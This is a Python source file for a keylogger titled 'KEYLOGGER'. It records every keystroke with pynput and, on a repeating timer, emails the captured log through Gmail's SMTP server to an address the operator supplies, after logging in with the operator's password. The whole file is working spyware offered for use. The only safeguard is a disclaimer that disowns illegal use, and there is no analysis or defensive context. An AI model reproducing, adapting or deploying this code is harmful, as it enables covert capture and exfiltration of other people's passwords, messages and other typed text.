from click import style
from pynput.keyboard import Listener
from threading import Timer
from datetime import datetime
from getpass import getpass
from colorama import init, Fore, Style
from pyfiglet import figlet_format
from termcolor import cprint

import smtplib
import signal
import sys
import time

exec_time_start = time.time()

def sigint_handler(signal, frame):
    exec_time_end = time.time()
    total = round(exec_time_end - exec_time_start, 1)
    print (Fore.RED + '\n\nProcess terminated [0]' + Style.RESET_ALL + ' - Execution time: ' + str(total) + " seconds\n")
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

init(autoreset=True)

print("\n")
cprint(figlet_format('KEYLOGGER', font='slant'))

disclaimer = """Do not attempt to violate the law. 
If you planned to use the content for illegal purpose, 
i'm not be responsible of your actions."""

print(Fore.RED + disclaimer + "\n" + Style.RESET_ALL)

EMAIL_ADDRESS = input("Email Address: ")
while "@gmail.com" not in EMAIL_ADDRESS:
    print(Fore.YELLOW +"Wrong Mail Format...\n"+ Style.RESET_ALL)
    EMAIL_ADDRESS = input("Email Address: ")

EMAIL_PASSWD = getpass("\nEmail password: ")

flag = False
while flag is False:
    try:
        TIME = float(input("\nAverage sending mail time: "))
        flag = True
    except ValueError:
        print(Fore.YELLOW +"Wrong format value..."+ Style.RESET_ALL)
        flag = False

now = datetime.now()

msg = """ From: Keylogger Script
To: """ + EMAIL_ADDRESS + """
Subject: Keylogger Log Mail Content

""" + str(disclaimer).upper() + """

[ -- ] STARTING TIME: """ + str(now) + """

""" 

def on_press(key):
    global msg
    keystroke = str(key).replace("'", "")
    
    if keystroke == 'Key.enter': msg += " [ ENTER ] \n"
    elif keystroke == 'Key.backspace': msg = msg[:-1] 
    elif keystroke == 'Key.space': msg += ' '
    elif keystroke == 'Key.caps_lock': msg += ''
    elif "Key" in keystroke: msg += " [ "+ str(key).replace("Key.", "").upper() +" ] "
    else: msg += keystroke

def send():
    global msg
    if len(msg)>0: 
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
        print("[ - ] " + str(datetime.now()) + ": Message Send!")
    t1 = Timer(TIME, send)
    t1.daemon = True
    t1.start()
    t1.join()
 
listener = Listener(on_press=on_press)
listener.start()
 
server=smtplib.SMTP('smtp.gmail.com',587)
server.starttls()

try: server.login(EMAIL_ADDRESS, EMAIL_PASSWD), print(Fore.GREEN + "\nConnection ESTABLISHED\n" + Style.RESET_ALL)
except smtplib.SMTPAuthenticationError: print(Fore.RED + "\nConnection REFUSED" + Style.RESET_ALL + " (Check credentials or the references)\n"), exit()

main_timer = Timer(5.0, send)
main_timer.daemon = True
main_timer.start()
main_timer.join()